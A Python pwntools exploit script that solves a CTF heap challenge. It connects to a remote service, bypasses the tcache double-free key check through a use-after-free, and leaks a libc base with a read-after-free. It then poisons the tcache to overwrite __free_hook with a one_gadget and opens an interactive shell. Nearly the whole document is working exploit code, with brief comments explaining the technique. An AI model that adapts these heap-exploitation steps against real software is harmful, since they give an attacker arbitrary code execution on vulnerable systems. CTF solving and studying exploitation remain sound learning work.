#!/usr/bin/env python3

#A heap note challenge with only two allocations 0x90 and 0x40 chunk which is a hidden option not shown in menu
#There are multiple vulns in the challenge and binary has full security stance 
#The vulnerabilities are
#1)constrained use after free
#2)Read after free to read leaks
#3)Double free
#The problem is the use after free allow us to only tamper second and third quadword of the chunk
#Only using the double free primitive will allow us to tamper first quadword
#The difficult part is that we can only request 6 chunks.
#Inside this we will have to fill tcache ,get the libc leak and poison the tcache
#And use it to overwrite the free hook with one gadget address (offset 0xe6c81)
#Double free mitigation is present in tcache2..So filling up the tcache requires some tweaking
#We all know the tcache key second quadword of the chunk mitigates double free 
#By checking the value is equal to the address of tcache chunk
#But the use after free can tamper second quadword so we can bypass the tcache key checks
#And use this to fill the tcache by only a single 0x90 chunk
#And then when the 0x90 chunk enters into the unsortedbin read it to get the leaks
#And finally chain the uaf and double free to poison the tcache 
#To overwrite the free hook with one gadget



from pwn import *
import sys

e = ELF("./vuln_patched")
#r = process("./vuln_patched")
r = remote("193.57.159.27",24520)
libc = ELF("./libc.so.6")


def malloc(index):
    r.sendafter(b">",b"b\n")
    r.sendafter(b"ID",f"{index}\n")

def mallocd(index):
    r.sendafter(b">",b"B\n")
    r.sendafter(b"ID",f"{index}\n")

def free(index):
    r.sendafter(b">",b"s\n")
    r.sendafter(b"index?",f"{index}\n")

def edit(index,price,data):
    r.sendafter(b">",b"e\n")
    r.sendafter(b"index?",f"{index}\n")
    r.sendafter(b"price:",f"{price}\n")
    r.sendafter(b"name:",data + b"\n")

def view(index):
    r.sendafter(b">",b"v\n")
    r.sendafter(b"index?",f"{index}\n")
    r.recvuntil(b"ID: ")
    leak = r.recvline().strip()
    return leak



mallocd(0)
malloc(100)
mallocd(100)
for i in range(0,7):
    free(1)
    edit(1,64,b"\x00\x00\x00")
log.info("Multiple double frees to fill tcache")
free(1)
libc_base = int(view(1),10) - 0x1EBBE0
log.info("Using read after free to read unsortedbin metadata")
log.info("The libc leak of the process is " + hex(libc_base))
free(2)
edit(2,41,b"\x00\x00\x00\x00")
free(2)
edit(2,41,b"\x00\x00\x00\x00")
free(2)
edit(2,41,b"\x00\x00\x00\x00")
log.info("Some more double frees to tamper malloc inline metadata")
mallocd(libc_base + libc.sym["__free_hook"])
log.info("free_hook inserted into the tcache bin")
mallocd(100)
mallocd(libc_base + 0xe6c81)
log.info("free_hook overwritten with the address of one_gadget")
free(0)
r.interactive()
